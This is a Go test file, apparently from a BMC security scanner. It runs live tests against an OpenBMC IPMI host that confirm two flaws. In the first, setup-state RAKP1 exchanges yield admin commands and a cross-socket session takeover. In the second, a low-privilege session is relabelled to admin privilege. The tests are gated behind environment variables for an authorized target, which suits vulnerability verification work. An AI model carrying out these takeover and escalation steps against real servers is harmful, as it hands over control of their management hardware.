package ipmi

import (
	"context"
	"os"
	"strconv"
	"testing"
	"time"
)

func TestOpenBMCSetupFlowLive(t *testing.T) {
	host, port := openBMCLiveTarget(t)
	username := os.Getenv("OOBSCAN_OPENBMC_LIVE_USER")
	if username == "" {
		username = "root"
	}
	suite := CipherAlgos{Suite: 17, Auth: RAKPHMACSHA256, Integrity: IntegrityHMACSHA256128, Conf: ConfAESCBC}

	probe, err := probeOpenBMCSetupRetry(host, port, username, suite, 6*time.Second, 3)
	if err != nil {
		t.Fatalf("openbmc setup probe failed: %v", err)
	}
	if !probe.OpenSessionOnlyRejected {
		t.Fatalf("open-session-only negative control did not reject local command: %+v", probe)
	}
	if !probe.SetupCommandsWork || !probe.AdminPrivAccepted {
		t.Fatalf("setup RAKP1 did not expose local admin commands: %+v", probe)
	}
	if !probe.CrossSocketSetupCommandsWork {
		t.Fatalf("cross-socket setup takeover was not observed: %+v", probe)
	}
	flow := AuthFlow{Version: "2.0", Mode: "openbmcSetup", Username: username, Suite: suite, Source: "live-test"}
	inv, err := CollectPostAuthInventory(context.Background(), host, port, flow, 6*time.Second)
	if err != nil {
		t.Fatalf("openbmc setup inventory failed: %v", err)
	}
	if inv == nil || inv.OpenBMCSetup == nil {
		t.Fatalf("missing openbmc setup data: %+v", inv)
	}
	if len(inv.SetPrivAttempts) == 0 || !inv.SetPrivAttempts[0].Success {
		t.Fatalf("set-priv did not succeed: %+v", inv.SetPrivAttempts)
	}
	if inv.OpenBMCSetup.PrivilegeQueryCC != 0x00 || inv.OpenBMCSetup.PrivilegeQueryDataHex == "" {
		t.Fatalf("missing useful privilege query data: %+v", inv.OpenBMCSetup)
	}
	if inv.OpenBMCSetup.PayloadStatusCC != 0x00 || inv.OpenBMCSetup.PayloadStatusDataHex == "" {
		t.Fatalf("missing useful payload status data: %+v", inv.OpenBMCSetup)
	}
	t.Logf("openbmc setup data: user=%s openSessionOnlyRejected=%t crossSocket=%t priv=%s payloadStatus=%s payloadInfo=%s providerBlocked=%t", username, probe.OpenSessionOnlyRejected, probe.CrossSocketSetupCommandsWork, inv.OpenBMCSetup.PrivilegeQueryDataHex, inv.OpenBMCSetup.PayloadStatusDataHex, inv.OpenBMCSetup.PayloadInfoDataHex, inv.OpenBMCSetup.ProviderBlocked)
}

func probeOpenBMCSetupRetry(host string, port int, username string, suite CipherAlgos, timeout time.Duration, attempts int) (*OpenBMCSetupProbe, error) {
	var lastErr error
	var last *OpenBMCSetupProbe
	for range attempts {
		probe, err := ProbeOpenBMCSetupState(host, port, username, suite, timeout)
		if err == nil && probe != nil && probe.SetupCommandsWork {
			return probe, nil
		}
		last = probe
		lastErr = err
		if err != nil && !isTimeoutErr(err) {
			break
		}
	}
	return last, lastErr
}

func TestOpenBMCActiveRelabelLive(t *testing.T) {
	host, port := openBMCLiveTarget(t)
	adminUser := os.Getenv("OOBSCAN_OPENBMC_LIVE_USER")
	if adminUser == "" {
		adminUser = "root"
	}
	lowUser := os.Getenv("OOBSCAN_OPENBMC_LOW_USER")
	lowPass := os.Getenv("OOBSCAN_OPENBMC_LOW_PASS")
	if lowUser == "" || lowPass == "" {
		t.Skip("set OOBSCAN_OPENBMC_LOW_USER and OOBSCAN_OPENBMC_LOW_PASS to run active-session relabel live test")
	}
	suite := CipherAlgos{Suite: 17, Auth: RAKPHMACSHA256, Integrity: IntegrityHMACSHA256128, Conf: ConfAESCBC}
	s, err := OpenSession20User(host, port, lowUser, lowPass, suite, 6*time.Second)
	if err != nil {
		t.Fatalf("low user session failed: %v", err)
	}
	defer s.Close()
	beforeAdmin, err := s.RequestSessionPrivilege(0x04)
	if err != nil {
		t.Fatalf("before relabel set-priv failed unexpectedly: %v", err)
	}
	if beforeAdmin.Success {
		t.Fatalf("low user could already raise to admin before relabel: %+v", beforeAdmin)
	}
	beforeUserAccessCC, _, err := s.Exec(NetFnApp, CmdGetUserAccess, []byte{0x01, 0x02})
	if err != nil {
		t.Fatalf("before relabel user-access probe failed: %v", err)
	}
	r2, err := s.RelabelActiveSession(adminUser, 0x04)
	if err != nil || r2 == nil || r2.ErrorCode != 0 {
		t.Fatalf("active relabel RAKP1 failed r=%+v err=%v", r2, err)
	}
	afterAdmin, err := s.RequestSessionPrivilege(0x04)
	if err != nil || !afterAdmin.Success {
		t.Fatalf("after relabel admin set-priv failed: %+v err=%v", afterAdmin, err)
	}
	devCC, devData, err := s.Exec(NetFnApp, CmdGetDeviceID, nil)
	if err != nil || devCC != 0x00 || len(devData) == 0 {
		t.Fatalf("after relabel provider command failed cc=0x%02x len=%d err=%v", devCC, len(devData), err)
	}
	afterUserAccessCC, afterUserAccess, err := s.Exec(NetFnApp, CmdGetUserAccess, []byte{0x01, 0x02})
	if err != nil || afterUserAccessCC != 0x00 || len(afterUserAccess) == 0 {
		t.Fatalf("after relabel privileged user-access failed cc=0x%02x data=%x err=%v", afterUserAccessCC, afterUserAccess, err)
	}
	t.Logf("openbmc relabel data: low=%s admin=%s beforeSetPriv=0x%02x beforeUserAccess=0x%02x afterSetPriv=0x%02x getDeviceId=%x userAccess=%x", lowUser, adminUser, beforeAdmin.CC, beforeUserAccessCC, afterAdmin.CC, devData, afterUserAccess)
}

func openBMCLiveTarget(t *testing.T) (string, int) {
	t.Helper()
	host := os.Getenv("OOBSCAN_OPENBMC_LIVE_HOST")
	if host == "" {
		t.Skip("set OOBSCAN_OPENBMC_LIVE_HOST to run authorized OpenBMC live tests")
	}
	port := DefaultPort
	if raw := os.Getenv("OOBSCAN_OPENBMC_LIVE_PORT"); raw != "" {
		v, err := strconv.Atoi(raw)
		if err != nil || v <= 0 {
			t.Fatalf("invalid OOBSCAN_OPENBMC_LIVE_PORT=%q", raw)
		}
		port = v
	}
	return host, port
}
